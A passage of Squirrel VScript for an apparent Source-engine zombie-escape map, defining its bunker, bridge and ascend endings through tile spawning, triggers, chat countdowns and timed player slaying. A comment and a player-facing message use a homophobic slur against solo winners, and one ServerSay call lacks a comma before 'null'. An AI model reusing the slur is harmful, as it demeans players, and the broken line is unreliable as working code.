						EntFire("bunkerending_doorkilltrigs","Enable","",defend_time+10.00,null);	//__CSS__ doorstuck safegurd
						
						local inviswall_pos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+
							(md.direction_next*(10.5*man.GRID_SIZE))+
							(direction_next_left*((0)*man.GRID_SIZE))+
							Vector(0,0,8*man.ELEVATION);
						local inviswall_model = ::TILEVARIANTS["HOLD_1"][::THEME].main[RandomInt(0,::TILEVARIANTS["HOLD_1"][::THEME].main.len()-1)];
						//::manager.PrecacheModel(inviswall_model);
						::Ent(inviswall_pos,Vector(),"trigger_multiple",{
								spawnflags=1,
								filtername="filter_t",
							},{function Touch(){
								local toucher = activator;	//__CSS__ activator may get reset, store toucher
								if(toucher==null||toucher.IsAlive()==false)return;
								if(toucher.GetHealth()<=::ENDINGS.BUNKER.z_inside_hpcap)return;
								EntFireByHandle(toucher,"AddOutput","health "+::ENDINGS.BUNKER.z_inside_hpcap.tostring(),0.00,null,null);
							},function ToggleTick(){
								EntFireByHandle(self,"RunScriptCode"," ToggleTick(); ",1.00,null,null);
								EntFireByHandle(self,"Enable","",0.00,null,null);
								EntFireByHandle(self,"Disable","",0.10,null,null);
							},function Run(){
								EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch():0:-1",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
								EntFireByHandle(self,"AddOutput","mins -257 -257 -600",0.00,null,null);
								EntFireByHandle(self,"AddOutput","maxs 257 257 600",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode"," ToggleTick(); ",1.00,null,null);
							}});
						::Ent(inviswall_pos,Vector(),"prop_physics_override",{
						//::Ent(inviswall_pos,Vector(),"prop_dynamic",{			//__CSS__ no more physics
								model = inviswall_model,
								spawnflags = 10,	//8:"motion disabled" + 2:"don't take physics damage"
								DisableBoneFollowers = true,
							},{
							function Run(){
								EntFireByHandle(self,"AddOutput","mins -390 -390 0",0.00,null,null);
								EntFireByHandle(self,"AddOutput","maxs 390 390 17000",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetSolid(2);",0.05,null,null);
								EntFireByHandle(self,"AddOutput","rendermode 1",0.00,null,null);
								EntFireByHandle(self,"AddOutput","renderamt 0",0.00,null,null);
							}});
						local spawnlist = [//+x:forward, +y:left, +z:up(elevation)		OPTIONAL PARAM:targetname="",
							//{x = 0,			y = 1,			z = -10.00,			yaw = null,			index = 5},
								{x = 0.02,			y = 0.5,		z = -0.10,			yaw = null,			index = 25,		targetname="ending_bunker_tpstartblocks"},
								{x = 0.02,			y = -0.5,		z = -0.10,			yaw = null,			index = 25,		targetname="ending_bunker_tpstartblocks"},
								{x = 16,			y = 4.5+sideofs,		z = 20.00,			yaw = null,			index = 1},
								{x = 16,			y = -1+sideofs,			z = 20.00,			yaw = null,			index = 1},
								{x = 16,			y = 10+sideofs,			z = 20.00,			yaw = null,			index = 1},
								{x = 6,				y = -1+sideofs,			z = 20.00,			yaw = null,			index = 1},
								{x = 6,				y = 10+sideofs,			z = 20.00,			yaw = null,			index = 1},
								{x = 10.5,			y = -1+sideofs,			z = 20.00,			yaw = null,			index = 1},
								{x = 10.5,			y = 10+sideofs,			z = 20.00,			yaw = null,			index = 1},
						];
						for(local i=0;i<16;i++)
						{
							for(local j=0;j<10;j++)
							{
								local tindex = 5;
								local tyaw = null;
								local z = 0.00;
								local isbunker = false;
								if(	i==14 && j>0 && j<9 || 
									i==7 && j>0 && j<9 || 
									j==1 && i>7 && i<14 || 
									j==8 && i>7 && i<14 )
									{
										z = 10;
										isbunker = true;
										if(i % 3 && j % 3){}
										else
										{
											z = 2;
											local doormodel = ::TILEVARIANTS["HOLD_1"][::THEME].main[RandomInt(0,::TILEVARIANTS["HOLD_1"][::THEME].main.len()-1)];
											//::manager.PrecacheModel(doormodel);
											local doorpos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+
												(md.direction_next*(i*man.GRID_SIZE))+
												(direction_next_left*((j+sideofs)*man.GRID_SIZE))+
												Vector(0,0,z*man.ELEVATION);
											local opening_height = 0.00+opening_crouch;
											//if(RandomInt(0,1)==1)opening_height = 0.00+opening_stand;
											
											
											//::Ent(doorpos,Vector(0,randyaw[RandomInt(0,randyaw.len()-1)],0),"prop_physics_override",{
											::Ent(doorpos,Vector(0,randyaw[RandomInt(0,randyaw.len()-1)],0),"prop_dynamic",{		//__CSS__ no more physics
													model = doormodel,
													spawnflags = 10,	//8:"motion disabled" + 2:"don't take physics damage"
													solid = 6,
													//DisableBoneFollowers = true,
												},{
												opening_height = opening_height,
												function Run(){
												
													//__CSS__ no more physics
													//self.SetSize(Vector(-48,-48,0),Vector(48,48,150));
													//self.SetSolid(2);
													
													::Ent(self.GetOrigin()+Vector(0,0,32),Vector(),"func_movelinear",{
															speed = 20,
															movedistance = opening_height,
															blockdamage = 99999,
															movedir = "-90 0 0",
															targetname = "bunker_door",
															spawnflags = 8,
														},{
														model = self,
														opening_height = opening_height,
														function Run(){
															EntFireByHandle(model,"SetParent","!activator",0.00,self,null);
														}});
													::Ent(self.GetOrigin(),Vector(),"trigger_multiple",{		//__CSS__ doorstuck safegurd
															spawnflags = 1,
															StartDisabled = 1,
															targetname = "bunkerending_doorkilltrigs",
														},{
														master = self,
														function Touch(){
															::HurtPlayer(activator,true);
														},function Run(){
															self.SetSize(Vector(-47,-47,-256),Vector(47,47,256));
															self.SetSolid(2);
															EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
														}});
													
													
												}});
											
											
											
										}
									}
								if(i > 7 && i < 14 && j > 1 && j < 8)
								{
									spawnlist.push({x = i,		y = j+sideofs,		z = 8.00,		yaw = tyaw,		index = 25,		targetname="bunker"});
									z = 1;
									isbunker = true;
								}
								if(	i>7 && i<10 && j>1 && j<4 || 
									i>7 && i<10 && j>5 && j<8 || 
									i>11 && i<14 && j>1 && j<4 || 
									i>11 && i<14 && j>5 && j<8)
									{
										isbunker = true;
										z = 2;
										if(	i==8 && j==2 ||
											i==8 && j==7 ||
											i==13 && j==2 ||
											i==13 && j==7)
												z = null;
									}
								if(z == null)continue;
								local sl = {x = i,			y = j+sideofs,			z = z,			yaw = tyaw,			index = tindex};
								if(isbunker)sl.targetname <- "bunker";
								spawnlist.push(sl);
							}
						}
						foreach(s in spawnlist)
						{
							local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME].main.len()-1)];
							local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
							if(s.yaw!=null)spawndata.yaw = s.yaw;
							spawndata.pos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+	//start position, 3 width would be centered with this
								(md.direction_next*(s.x*man.GRID_SIZE))+
								(direction_next_left*(s.y*man.GRID_SIZE))+
								Vector(0,0,s.z*man.ELEVATION);
							local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model};
							if("targetname" in s)sq.targetname <- s.targetname;
							else sq.targetname <- "block_bunker_ending";
							::SpawnQueue.push(sq);
							::SpawnQueueSpawner.push(spawndata);
						}
					}},
				BRIDGE={	cancel_mapspawn=true,			movetp_clean=true,
						tp_delay = 28.00,			//after bridge spawns, how long to wait until cleaning previous stage+setting TP to bridge start (was 18.20 for music)
						holdtime = 44.00,			//how long to wait until the bridge should start crumbling (from start to finish) (45.00 bup)
						delay_slaytime = 25.00,		//once bridge is 100% crumbled, wait this time before slaying everyone (failing, if h's didn't kill z's)
						crumble_rate = 0.85,		//how fast to tick the bridge crumbling		(1.26 bup)
						crumble_dist = 250,			//how many units to scan for blocks each "crumble"
						crumble_travel = 100,		//how far to travel the crumble forward each tick
						crumble_lrtravel = 150,		//how far to travel the crumble left/right each tick (from the center, alternating each tick)
						detail_chance = 25.00,		//percentage-change for detail props to spawn on bridge (only top/main path, not bottom)
						detail_limit = 30,			//limit of detail props to spawn on bridge
						humanswon = false,
					function Run(){
						if(::ENABLE_ENDING_MUSIC){::Sound("#music/luffaren_collective/starjump.mp3",Vector(),null,0,70.00,100,10);}
						::ServerSay("say [BRIDGE ENDING]",0.00,null);
						::ServerSay("say [BRIDGE ENDING]",0.01,null);
						::ServerSay("say [BRIDGE ENDING]",0.02,null);
						::ServerSay("say [BRIDGE ENDING] HOLD THE BRIDGE FOR "+(1.00+holdtime).tostring()+"s",1.05,null);	//(0.00+... bup)
						::ServerSay("say [BRIDGE ENDING] HOLD THE BRIDGE FOR "+(1.00+holdtime).tostring()+"s",1.06,null);	//(0.00+... bup)
						::ServerSay("say [BRIDGE ENDING] HOLD THE BRIDGE FOR "+(1.00+holdtime).tostring()+"s",1.07,null);	//(0.00+... bup)
						local ii=(0.00+holdtime-60.00);if(ii>0.00)
							::ServerSay("say [BRIDGE ENDING] BRIDGE CRUMBLING IN 60s",ii,null);
						ii=(0.00+holdtime-30.00);if(ii>0.00)
							::ServerSay("say [BRIDGE ENDING] BRIDGE CRUMBLING IN 30s",ii,null);
						ii=(0.00+holdtime-10.00);if(ii>0.00)
							::ServerSay("say [BRIDGE ENDING] BRIDGE CRUMBLING IN 10s",ii,null);
						ii=(0.00+holdtime-5.00);if(ii>0.00)
							::ServerSay("say [BRIDGE ENDING] BRIDGE CRUMBLING IN 5s",ii,null);
						ii=(0.00+holdtime-4.00);if(ii>0.00)
							::ServerSay("say [BRIDGE ENDING] BRIDGE CRUMBLING IN 4s",ii,null);
						ii=(0.00+holdtime-3.00);if(ii>0.00)
							::ServerSay("say [BRIDGE ENDING] BRIDGE CRUMBLING IN 3s",ii,null);
						ii=(0.00+holdtime-2.00);if(ii>0.00)
							::ServerSay("say [BRIDGE ENDING] BRIDGE CRUMBLING IN 2s",ii,null);
						ii=(0.00+holdtime-1.00);if(ii>0.00)
							::ServerSay("say [BRIDGE ENDING] BRIDGE CRUMBLING IN 1s",ii,null);
						::ServerSay("say [BRIDGE ENDING] THE BRIDGE IS STARTING TO CRUMBLE",holdtime+0.00,null);
						::ServerSay("say [BRIDGE ENDING] THE BRIDGE IS STARTING TO CRUMBLE",holdtime+0.01,null);
						::ServerSay("say [BRIDGE ENDING] THE BRIDGE IS STARTING TO CRUMBLE",holdtime+0.02,null);
						::ServerSay("say [BRIDGE ENDING] RESPAWN IS DISABLED",holdtime+2.03,null);
						::ServerSay("say [BRIDGE ENDING] RESPAWN IS DISABLED",holdtime+2.04,null);
						::ServerSay("say [BRIDGE ENDING] RESPAWN IS DISABLED",holdtime+2.05,null);
						::ServerSay("say [BRIDGE ENDING] DEFEND!",holdtime+3.06,null);
						::ServerSay("say [BRIDGE ENDING] DEFEND!",holdtime+3.07,null);
						::ServerSay("say [BRIDGE ENDING] DEFEND!",holdtime+3.08,null);
						::delay_check_enabled = false;
						local man = ::manager.GetScriptScope();
						local md = ::MAPDATA[man.mapspawnindex-1];
						local direction_next_left = ::AnglesToDir(::DirToAngles(md.direction_next)+Vector(0,90,0));
						local forward_yaw = ::DirToAngles(md.direction_next).y;
						local randyaw = [0,90,180,270];
						local spawnlist = [//+x:forward, +y:left
								{x = 1.02,			y = 0.02,		elevation = -0.10,			yaw = null,		index = 25,		targetname="ending_bridge_tpstartblocks"},
							{x = 0,			y = 0,			elevation = 0.00,			yaw = null,			index = 5},
							{x = 0,			y = 1,			elevation = -10.00,			yaw = null,			index = 5},
							{x = 0,			y = -1,			elevation = -10.00,			yaw = null,			index = 5},
								{x = 0,			y = -1,			elevation = -20.00,			yaw = forward_yaw-90,			index = 3},
								{x = 0,			y = 1,			elevation = -20.00,			yaw = forward_yaw+90,			index = 3},
								{x = 39,		y = -3,			elevation = -20.00,			yaw = forward_yaw+180,			index = 3},
								{x = 39,		y = 3,			elevation = -20.00,			yaw = forward_yaw+180,			index = 3},
						];
						local tppos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+
								(md.direction_next*(1.00*man.GRID_SIZE))+
								(direction_next_left*(0.00*man.GRID_SIZE))+
								Vector(0,0,8);
						::TPmovequeue.push(tppos);
						::TPmovequeue.push(::DirToAngles(md.direction_next));
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_delay,null);
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_delay+0.05,null);
						::ListenRoundEnd({function RoundEnd(winner,data){
								if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
								if(winner==3)
								{
									::ENDINGS.BRIDGE.humanswon = true;
									::ServerSay("say [BRIDGE ENDING] YOU WON!",0.00,null);
									::ServerSay("say [BRIDGE ENDING] YOU WON!",0.01,null);
									::ServerSay("say [BRIDGE ENDING] YOU WON!",0.02,null);
									printl("[BRIDGE ENDING] YOU WON!");
									::RoundWon();
								}
								else
								{
									::ServerSay("say [BRIDGE ENDING] YOU LOST!",0.00,null);
									::ServerSay("say [BRIDGE ENDING] YOU LOST!",0.01,null);
									::ServerSay("say [BRIDGE ENDING] YOU LOST!",0.02,null);
								}
							}});
						local ttravel = 40*man.GRID_SIZE;
						::Ent(Vector(),Vector(),"logic_relay",{},{
								mansc = null,
								crumble_ticking = true,
								crumble_pos = Vector()+md.end_pos,
								crumble_dir = Vector()+md.direction_next,
								crumble_dirl = Vector()+direction_next_left,
								crumble_lrstate = false,
								holdtime = holdtime,
								ttravel = ttravel,
								traveldist = 0.00,
							function MassSlay(){
								if(::ENDINGS.BRIDGE.humanswon)return;
								EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",0.00,null);
							},function MassSlayWarning(){
								if(::ENDINGS.BRIDGE.humanswon)return;
									local ds = 0.00+::ENDINGS.BRIDGE.delay_slaytime;
									ds -= 5.00;
									if(ds<=0.00)return;
									::ServerSay("say [BRIDGE ENDING] KILL ALL ZOMBIES WITHIN "+ds.tostring()+"s TO WIN",0.00,null);
									::ServerSay("say [BRIDGE ENDING] KILL ALL ZOMBIES WITHIN "+ds.tostring()+"s TO WIN",0.01,null);
									::ServerSay("say [BRIDGE ENDING] KILL ALL ZOMBIES WITHIN "+ds.tostring()+"s TO WIN",0.02,null);
							},function Tick(){
								if(!crumble_ticking)
								{
									EntFireByHandle(self,"RunScriptCode"," MassSlay(); ",::ENDINGS.BRIDGE.delay_slaytime,null,null);
									EntFireByHandle(self,"RunScriptCode"," MassSlayWarning(); ",5.00,null,null);
									return;
								}
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",::ENDINGS.BRIDGE.crumble_rate,null,null);
								mansc.KillTilesWithin(crumble_pos,::ENDINGS.BRIDGE.crumble_dist,2000,false,false,false);
								crumble_lrstate = !crumble_lrstate;
								if(crumble_lrstate)
									crumble_pos -= (crumble_dirl*(::ENDINGS.BRIDGE.crumble_lrtravel*2));
								else
									crumble_pos += (crumble_dirl*(::ENDINGS.BRIDGE.crumble_lrtravel*2));
								crumble_pos += (crumble_dir * ::ENDINGS.BRIDGE.crumble_travel);
								traveldist += ::ENDINGS.BRIDGE.crumble_travel;
								if(traveldist>=ttravel)
									crumble_ticking = false;
							},function Start(){
								EntFire("ending_bridge_tpstartblocks","Kill","",1.50,null);
								EntFire("manager","RunScriptCode"," EnableSpawnKiller(); ",1.00,null);
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.00,null,null);
								mansc = ::manager.GetScriptScope();
								crumble_pos += (crumble_dirl*(::ENDINGS.BRIDGE.crumble_lrtravel));
							},function Run(){
								EntFireByHandle(self,"RunScriptCode"," Start(); ",holdtime,null,null);
							}});
						local mcount = 0;
						local propamt = 0;
						for(local i=1;i<40;i++)
						{
							if(!(i % 5))
							{
								mcount++;
								if(mcount!=4)
								{
									spawnlist.push({x = i,		y = 0,			elevation = 0.00,			yaw = null,			index = 25});
									spawnlist.push({x = i,		y = 0,			elevation = -2.00,			yaw = null,			index = 25});
								}
								if(i<33)
								{
									spawnlist.push({x = i+2.50,	y = 2,			elevation = 10.00,			yaw = null,			index = 1});
									spawnlist.push({x = i+2.50,	y = -2,			elevation = 10.00,			yaw = null,			index = 1});
									spawnlist.push({x = i+2.52,	y = 2.5,		elevation = 0.00,			yaw = null,			index = 25});
									spawnlist.push({x = i+2.52,	y = -2.5,		elevation = 0.00,			yaw = null,			index = 25});
								}
							}
							else
							{
								//if(i==2)	//not needed, z's are invincible at TP after all..
								//	spawnlist.push({x = i,		y = 0,			elevation = 5.00,			yaw = null,			index = 5});
								//else
									spawnlist.push({x = i,		y = 0,			elevation = 0.00,			yaw = null,			index = 5});
							}
							if(i!=20)
							{
								spawnlist.push({x = i,			y = -1,			elevation = 0.00,			yaw = null,			index = 25});
								spawnlist.push({x = i,			y = 1,			elevation = 0.00,			yaw = null,			index = 25});
								if(i!=19 && i !=21)
								{
									spawnlist.push({x = i,			y = -0.50,		elevation = -1.00,			yaw = null,			index = 25});
									spawnlist.push({x = i,			y = 0.50,		elevation = -1.00,			yaw = null,			index = 25});
								}
								local yrand = [1,0,-1];
								if(i > 2 && RandomFloat(0.00,100.00) <= detail_chance)
								{
									propamt++;
									if(propamt < detail_limit)
										spawnlist.push({x = i,		y = yrand[RandomInt(0,yrand.len()-1)],	elevation = 0.00,	yaw = null,	index = 90});
								}
							}
							spawnlist.push({x = i,			y = -0.50,		elevation = -10.00,			yaw = null,			index = 5});
							spawnlist.push({x = i,			y = 0.50,		elevation = -10.00,			yaw = null,			index = 5});
						}
						for(local i=0;i<4;i++)
						{
							for(local j=-3;j<4;j++)
							{
								if(i==3)
								{
									if(j <= -3 || j >= 3)
										continue;
								}
								local elev = 0.00;
								if(i==0)
								{
									if(j == -2 || j == 2)
										elev = 2.00;
								}
								spawnlist.push({x = 40+i,			y = j,		elevation = elev,			yaw = null,			index = 2});
							}
						}
						foreach(s in spawnlist)
						{
							local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME].main.len()-1)];
							local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
							if(s.yaw!=null)spawndata.yaw = s.yaw;
							spawndata.pos = Vector()+md.end_pos+(md.direction_next*(man.GRID_SIZE/2))+	//start position, 3 width would be centered with this
								(md.direction_next*(s.x*man.GRID_SIZE))+
								(direction_next_left*(s.y*man.GRID_SIZE))+
								Vector(0,0,s.elevation*man.ELEVATION);
							if(s.index==3)//LADDER
							{
								::ladder_spawnqueue.push({targetname="block_99999"});
								::ladderspawnqueuespawn.push({pos=spawndata.pos,rot=Vector(0,spawndata.yaw+180,0)});
							}
							else if(s.index==2)//START_END
								model = ::TILEVARIANTS[::TYPES[5].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[5].name][::THEME].main.len()-1)];
							local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model,targetname="block_bridge_ending"};
							if("targetname" in s)sq.targetname <- s.targetname;
							::SpawnQueue.push(sq);
							::SpawnQueueSpawner.push(spawndata);
						}
					}},
				ASCEND={	cancel_mapspawn=true,			movetp_clean=false,
						defend_time = 65.00,
						music = "#music/luffaren_collective/emerald_princess.mp3",				//try to time shit with the song
						ascend_rate = 0.46,
						ascend_zvel = 600,
						ascend_survive_z_above_stage = 2000,
						ascend_win_delay = 11.20,
						ascend_win_delay_slay_all = 35.00,
						ascend_ticking = true,
						round_lost = false,
						fade = null,
						fadetick = true,
						fadetick_rate = 0.46,
						fadetick_alpha = 10,		//__CSS__ og/pre-css5 was 50
						fadetick_fadetime = 0.40,
						kill_moonboost_item = true,
						moonboost_z_amount = 2,
						flight_z_amount = 8,
						moonboost_z_delay = 9.00, //must be above 0.10
					function SpawnMoonboostZ(){
						if(moonboost_z_amount<=0 && flight_z_amount<=0)return;
						local msg = moonboost_z_amount.tostring()+" Z-moonboost + "+flight_z_amount.tostring()+" Z-flight items spawned";
						::ServerSay("say [ASCEND ENDING] "+msg,0.00,null);
						::ServerSay("say [ASCEND ENDING] "+msg,0.01,null);
						::ServerSay("say [ASCEND ENDING] "+msg,0.02,null);
						::ServerSay("say [ASCEND ENDING] (Available at TP/start of previous stage)",1.03,null);
						::ServerSay("say [ASCEND ENDING] (Available at TP/start of previous stage)",1.04,null);
						::ServerSay("say [ASCEND ENDING] (Available at TP/start of previous stage)",1.05,null);
						local md = ::MAPDATA[::manager.GetScriptScope().mapspawnindex-2];
						for(local i=0;i<moonboost_z_amount;i++)
						{
							local spos = Vector(0,0,40)+md.start_pos-
								(md.direction_current*(::manager.GetScriptScope().BUFFER_SIZE*(::manager.GetScriptScope().GRID_SIZE)))+
								(md.direction_current*(::manager.GetScriptScope().GRID_SIZE/2))+
								(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*85);
							::ITEMS.moonboost.Spawn(spos,3);
						}
						for(local i=0;i<flight_z_amount;i++)
						{
							local spos = Vector(0,0,40)+md.start_pos-
								(md.direction_current*(::manager.GetScriptScope().BUFFER_SIZE*(::manager.GetScriptScope().GRID_SIZE)))+
								(md.direction_current*(::manager.GetScriptScope().GRID_SIZE/2))+
								(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*85);
							::ITEMS.flight.Spawn(spos);
						}
					},function Win(){
						local zlimit = 0.00+ascend_survive_z_above_stage+::MAPDATA[::manager.GetScriptScope().mapspawnindex-1].center_pos.z;
						ascend_win_delay = false;
						local wincount = 0;
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=3)continue;
							if(h.GetOrigin().z > zlimit)
							{
								EntFireByHandle(h,"AddOutput","movetype 0",0.00,null,null);
								EntFireByHandle(h,"AddOutput","targetname endsafeplayer",0.00,null,null);
								EntFireByHandle(h,"AddOutput","targetname endsafeplayer",0.05,null,null);
								wincount++;
							}
						}
						EntFire("manager","RunScriptCode"," EnableMassKiller(); ",0.10,null);		//targetname 'endsafeplayer' is safe
						if(wincount>0)
						{
							if(round_lost)
							{
								::ServerSay("say [ASCEND ENDING] YOU FAILED DURING ASCENSION - YOU LOSE!",0.00,null);
								::ServerSay("say [ASCEND ENDING] YOU FAILED DURING ASCENSION - YOU LOSE!",0.01,null);
								::ServerSay("say [ASCEND ENDING] YOU FAILED DURING ASCENSION - YOU LOSE!",0.02,null);
								return;
							}
							if(wincount==1 && ::GetPlayerCount() < 10)	//__CSS__ webscript - deny solofagging
							{
								::ServerSay("say [ASCEND ENDING] 1 HUMAN ASCENDED - SOLO WIN!",0.00,null);
								::ServerSay("say [ASCEND ENDING] 1 HUMAN ASCENDED - SOLO WIN!",0.01,null);
								::ServerSay("say [ASCEND ENDING] 1 HUMAN ASCENDED - SOLO WIN!",0.02,null);
							}
							else
							{
								::ServerSay("say [ASCEND ENDING] "+wincount.tostring()+" HUMANS ASCENDED - YOU WIN!",0.00,null);
								::ServerSay("say [ASCEND ENDING] "+wincount.tostring()+" HUMANS ASCENDED - YOU WIN!",0.01,null);
								::ServerSay("say [ASCEND ENDING] "+wincount.tostring()+" HUMANS ASCENDED - YOU WIN!",0.02,null);
							}
							printl("[ASCEND ENDING] YOU WON");
							::RoundWon(false);
						}
						else
						{
							::ServerSay("say [ASCEND ENDING] NO HUMANS ASCENDED - YOU LOSE!",0.00,null);
							::ServerSay("say [ASCEND ENDING] NO HUMANS ASCENDED - YOU LOSE!",0.01,null);
							::ServerSay("say [ASCEND ENDING] NO HUMANS ASCENDED - YOU LOSE!",0.02,null);
						}
					},function TickFade(){
						if(!fadetick)return;
						EntFire("manager","RunScriptCode"," ENDINGS.ASCEND.TickFade(); ",fadetick_rate,null);
						EntFireByHandle(fade,"Fade","",0.00,null,null);
					},function Tick(){
						if(!ascend_win_delay)return;
						EntFire("manager","RunScriptCode"," ENDINGS.ASCEND.Tick(); ",ascend_rate,null);
						
						local is_solo = false;	//__CSS__ webscript - deny solofagging
						if(::GetPlayerCount() >= 10)
						{
							local cta = 0;
							for(local h;h=Entities.FindByClassname(h,"player");)
							{
								if(h.GetTeam()==3&&h.IsAlive())cta++;
							}
							if(cta == 1) is_solo = true;
						}
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(is_solo)
							{
								ClientPrint(null,4,"SOLOFAG SPOTTED\nYOU FAIL\ngo for the teamwin next round");
								break;
							}
							if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=3)continue;
							local vel = h.GetVelocity();
							vel.z = 0.00+ascend_zvel;
							h.SetVelocity(vel);
						}
					},function Run(){
						::delay_check_enabled = false;
						if(::ENABLE_ENDING_MUSIC){::Sound(music,Vector(),null,0,70.00,100,10);}
						if(kill_moonboost_item)
						{
							if(Entities.FindByName(null,"item_moonboost")!=null)
							{
								EntFire("item_moonboost","Kill","",2.50,null);
								::ServerSay("say [ASCEND ENDING] removing human moonboost item(s)",2.50,null);
							}
						}
						EntFire("manager","RunScriptCode"," ENDINGS.ASCEND.SpawnMoonboostZ(); ",moonboost_z_delay,null);
						EntFire("manager","RunScriptCode"," ENDINGS.ASCEND.Tick(); ",defend_time,null);
						EntFire("manager","RunScriptCode"," ENDINGS.ASCEND.Win(); ",defend_time+ascend_win_delay,null);
						EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",defend_time+ascend_win_delay_slay_all,null);
						::ServerSay("say [ASCEND ENDING]",0.00,null);
						::ServerSay("say [ASCEND ENDING]",0.01,null);
						::ServerSay("say [ASCEND ENDING]",0.02,null);
						::ServerSay("say [ASCEND ENDING] YOU WILL SOON ASCEND TO THE HEAVENS",1.05,null);
						::ServerSay("say [ASCEND ENDING] YOU WILL SOON ASCEND TO THE HEAVENS",1.06,null);
						::ServerSay("say [ASCEND ENDING] YOU WILL SOON ASCEND TO THE HEAVENS",1.07,null);
						local ii = (0.00+defend_time-(defend_time-5.00));
						if(ii>0.00 && ii < defend_time)
						{
							::ServerSay("say [ASCEND ENDING] SURVIVE FOR "+(0.00+defend_time-5.00).tointeger().tostring()+"s",5.00,null);
							::ServerSay("say [ASCEND ENDING] SURVIVE FOR "+(0.00+defend_time-5.00).tointeger().tostring()+"s",5.01,null);
							::ServerSay("say [ASCEND ENDING] SURVIVE FOR "+(0.00+defend_time-5.00).tointeger().tostring()+"s",5.02,null);
						}
						ii=(0.00+defend_time-60.00);if(ii>0.00)
							::ServerSay("say [ASCEND ENDING] ASCENSION IN 60s",ii,null);
						ii=(0.00+defend_time-30.00);if(ii>0.00)
							::ServerSay("say [ASCEND ENDING] ASCENSION IN 30s",ii,null);
						ii=(0.00+defend_time-10.00);if(ii>0.00)
							::ServerSay("say [ASCEND ENDING] ASCENSION IN 10s",ii,null);
						ii=(0.00+defend_time-5.00);if(ii>0.00)
							::ServerSay("say [ASCEND ENDING] ASCENSION IN 5s",ii,null);
						ii=(0.00+defend_time-4.00);if(ii>0.00)
							::ServerSay("say [ASCEND ENDING] ASCENSION IN 4s",ii,null);
						ii=(0.00+defend_time-3.00);if(ii>0.00)
							::ServerSay("say [ASCEND ENDING] ASCENSION IN 3s",ii,null);
						ii=(0.00+defend_time-2.00);if(ii>0.00)
							::ServerSay("say [ASCEND ENDING] ASCENSION IN 2s",ii,null);
						ii=(0.00+defend_time-1.00);if(ii>0.00)
							::ServerSay("say [ASCEND ENDING] ASCENSION IN 1s",ii,null);
						EntFire("item_flight","RunScriptCode",
							" if(holder.GetMoveParent()!=null)EntFireByHandle(holder.GetMoveParent(),\"SetHealth\",\"-1\",0.00,null,null); ",
							(defend_time+ascend_win_delay)-0.50,null);
						EntFire("item_flight","Kill","",(defend_time+ascend_win_delay)-0.45,null);
						::ServerSay("say [ASCEND ENDING] THE ASCENSION HAS BEGUN!",defend_time+0.00,null);
						::ServerSay("say [ASCEND ENDING] THE ASCENSION HAS BEGUN!",defend_time+0.01,null);
						::ServerSay("say [ASCEND ENDING] THE ASCENSION HAS BEGUN!",defend_time+0.02null);
						::ListenRoundEnd({function RoundEnd(winner,data){
								if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
								printl("ListenRoundEnd: "+winner+" (3:CT, 2=T, 1=DRAW, null=BUGGED)");
								if(winner!=3)::ENDINGS.ASCEND.round_lost = true;
							}});
						fade = Entities.CreateByClassname("env_fade");
						fade.__KeyValueFromFloat("duration",1.00);
						fade.__KeyValueFromFloat("ReverseFadeDuration",fadetick_fadetime);
						fade.__KeyValueFromFloat("holdtime",0.00);
						fade.__KeyValueFromInt("spawnflags",1);
						fade.__KeyValueFromInt("renderamt",fadetick_alpha);
						EntFireByHandle(fade,"AddOutput","renderamt "+fadetick_alpha.tostring(),0.00,null,null);
						fade.__KeyValueFromVector("rendercolor",Vector(255,255,255));
						EntFire("manager","RunScriptCode"," ENDINGS.ASCEND.TickFade(); ",16.20,null);
						EntFire("manager","RunScriptCode"," ENDINGS.ASCEND.fadetick = false; ",defend_time,null);
						EntFireByHandle(fade,"AddOutput","duration 2.00",defend_time,null,null);
						EntFireByHandle(fade,"AddOutput","ReverseFadeDuration 2.00",defend_time,null,null);
						EntFireByHandle(fade,"AddOutput","holdtime 0.05",defend_time,null,null);
						EntFireByHandle(fade,"AddOutput","renderamt 255",defend_time,null,null);
						EntFireByHandle(fade,"Fade","",defend_time+0.02,null,null);
						EntFireByHandle(fade,"AddOutput","holdtime 1.00",defend_time+ascend_win_delay+0.00,null,null);
						EntFireByHandle(fade,"AddOutput","duration 7.00",defend_time+ascend_win_delay+0.00,null,null);
						EntFireByHandle(fade,"AddOutput","ReverseFadeDuration 7.00",defend_time+ascend_win_delay+0.00,null,null);
						EntFireByHandle(fade,"Fade","",defend_time+ascend_win_delay+0.02,null,null);
						EntFireByHandle(fade,"Kill","",defend_time+ascend_win_delay+1.00,null,null);
